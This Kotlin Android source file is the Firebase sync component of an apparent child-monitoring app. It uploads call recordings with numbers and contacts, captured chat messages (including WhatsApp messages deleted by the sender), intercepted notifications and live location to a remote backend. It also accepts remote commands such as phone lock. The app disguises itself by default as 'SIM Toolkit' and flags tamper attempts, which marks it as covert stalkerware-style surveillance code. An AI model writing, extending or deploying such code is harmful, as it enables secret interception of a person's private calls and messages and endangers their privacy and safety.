package com.vyra.kids.core

import android.content.Context
import android.net.Uri
import android.util.Log
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.google.firebase.storage.FirebaseStorage
import java.io.File

class FirebaseSyncManager private constructor(private val context: Context) {

    private val firestore: FirebaseFirestore by lazy { FirebaseFirestore.getInstance() }
    private val storage: FirebaseStorage by lazy { FirebaseStorage.getInstance() }

    private val childId: String
        get() = PrefsManager.getInstance(context).pairingCode.ifEmpty { "child_1" }

    companion object {
        @Volatile
        private var instance: FirebaseSyncManager? = null

        fun getInstance(context: Context): FirebaseSyncManager {
            return instance ?: synchronized(this) {
                instance ?: FirebaseSyncManager(context.applicationContext).also { instance = it }
            }
        }
    }

    /**
     * Updates live device telemetry (battery, online status, disguise profile, location)
     */
    fun syncDeviceStatus(
        batteryLevel: Int,
        isOnline: Boolean,
        disguise: String = "SIM Toolkit",
        location: String = "Live GPS Active"
    ) {
        try {
            val statusData = hashMapOf(
                "id" to childId,
                "name" to "Aryan",
                "deviceModel" to "Vivo T3 Pro 5G",
                "batteryLevel" to batteryLevel,
                "isOnline" to isOnline,
                "selectedDisguise" to disguise,
                "locationAddress" to location,
                "lastSeen" to FieldValue.serverTimestamp()
            )

            firestore.collection("devices")
                .document(childId)
                .set(statusData, SetOptions.merge())
                .addOnSuccessListener {
                    Log.d(AppConstants.TAG, "Firestore: Device status synced successfully")
                }
                .addOnFailureListener { e ->
                    Log.e(AppConstants.TAG, "Firestore: Failed to sync device status", e)
                }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in syncDeviceStatus", e)
        }
    }

    /**
     * Uploads call recording audio to Firebase Storage and records metadata in Firestore
     */
    fun syncCallRecord(
        callId: String,
        contactName: String,
        phoneNumber: String,
        callType: String,
        durationSeconds: Long,
        audioFile: File?,
        isTamperAttemptDetected: Boolean = false,
        onComplete: ((Boolean) -> Unit)? = null
    ) {
        try {
            if (audioFile != null && audioFile.exists()) {
                val storageRef = storage.reference.child("recordings/$childId/${audioFile.name}")
                val uploadTask = storageRef.putFile(Uri.fromFile(audioFile))

                uploadTask.addOnSuccessListener {
                    storageRef.downloadUrl.addOnSuccessListener { downloadUri ->
                        saveCallDoc(
                            callId, contactName, phoneNumber, callType,
                            durationSeconds, downloadUri.toString(), isTamperAttemptDetected, onComplete
                        )
                    }.addOnFailureListener {
                        saveCallDoc(
                            callId, contactName, phoneNumber, callType,
                            durationSeconds, audioFile.name, isTamperAttemptDetected, onComplete
                        )
                    }
                }.addOnFailureListener { e ->
                    Log.e(AppConstants.TAG, "Storage upload failed for ${audioFile.name}", e)
                    // Fallback to storing metadata with local file name
                    saveCallDoc(
                        callId, contactName, phoneNumber, callType,
                        durationSeconds, audioFile.name, isTamperAttemptDetected, onComplete
                    )
                }
            } else {
                saveCallDoc(
                    callId, contactName, phoneNumber, callType,
                    durationSeconds, "", isTamperAttemptDetected, onComplete
                )
            }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in syncCallRecord", e)
            onComplete?.invoke(false)
        }
    }

    private fun saveCallDoc(
        callId: String,
        contactName: String,
        phoneNumber: String,
        callType: String,
        durationSeconds: Long,
        recordingUrl: String,
        isTamperAttemptDetected: Boolean,
        onComplete: ((Boolean) -> Unit)?
    ) {
        val callData = hashMapOf(
            "id" to callId,
            "contactName" to contactName,
            "phoneNumber" to phoneNumber,
            "callType" to callType,
            "durationSeconds" to durationSeconds,
            "recordingUrl" to recordingUrl,
            "isTamperAttemptDetected" to isTamperAttemptDetected,
            "timestamp" to FieldValue.serverTimestamp()
        )

        firestore.collection("calls")
            .document(childId)
            .collection("records")
            .document(callId)
            .set(callData, SetOptions.merge())
            .addOnSuccessListener {
                Log.d(AppConstants.TAG, "Firestore: Call record $callId synced")
                onComplete?.invoke(true)
            }
            .addOnFailureListener { e ->
                Log.e(AppConstants.TAG, "Firestore: Failed to sync call record", e)
                onComplete?.invoke(false)
            }
    }

    /**
     * Syncs captured social chat messages (including WhatsApp deleted-for-everyone messages)
     */
    fun syncChatMessage(
        msgId: String,
        app: String,
        sender: String,
        text: String,
        isDeletedBySender: Boolean = false,
        isWatchlistTarget: Boolean = false
    ) {
        try {
            val msgData = hashMapOf(
                "id" to msgId,
                "app" to app,
                "sender" to sender,
                "text" to text,
                "isDeletedBySender" to isDeletedBySender,
                "isWatchlistTarget" to isWatchlistTarget,
                "timestamp" to FieldValue.serverTimestamp()
            )

            firestore.collection("chats")
                .document(childId)
                .collection("messages")
                .document(msgId)
                .set(msgData, SetOptions.merge())
                .addOnSuccessListener {
                    Log.d(AppConstants.TAG, "Firestore: Chat message synced ($app)")
                }
                .addOnFailureListener { e ->
                    Log.e(AppConstants.TAG, "Firestore: Failed to sync chat message", e)
                }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in syncChatMessage", e)
        }
    }

    /**
     * Syncs intercepted notification
     */
    fun syncNotification(
        itemId: String,
        packageName: String,
        appName: String,
        title: String,
        text: String,
        isImportant: Boolean = false
    ) {
        try {
            val itemData = hashMapOf(
                "id" to itemId,
                "packageName" to packageName,
                "appName" to appName,
                "title" to title,
                "text" to text,
                "isImportant" to isImportant,
                "timestamp" to FieldValue.serverTimestamp()
            )

            firestore.collection("notifications")
                .document(childId)
                .collection("items")
                .document(itemId)
                .set(itemData, SetOptions.merge())
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error in syncNotification", e)
        }
    }

    /**
     * Listens for real-time remote commands sent by Parent (Voice blast, Phone lock, Disguise change)
     */
    fun startListeningToCommands(onCommandReceived: (action: String, payload: Map<String, Any>) -> Unit) {
        try {
            firestore.collection("devices")
                .document(childId)
                .collection("commands")
                .whereEqualTo("status", "PENDING")
                .addSnapshotListener { snapshots, e ->
                    if (e != null) {
                        Log.e(AppConstants.TAG, "Listen failed for commands", e)
                        return@addSnapshotListener
                    }

                    if (snapshots != null && !snapshots.isEmpty) {
                        for (doc in snapshots.documents) {
                            val action = doc.getString("action") ?: continue
                            @Suppress("UNCHECKED_CAST")
                            val payload = doc.get("payload") as? Map<String, Any> ?: emptyMap()

                            // Mark as EXECUTED
                            doc.reference.update("status", "EXECUTED")

                            Log.d(AppConstants.TAG, "Received remote command: $action")
                            onCommandReceived(action, payload)
                        }
                    }
                }
        } catch (e: Exception) {
            Log.e(AppConstants.TAG, "Error starting command listener", e)
        }
    }
}
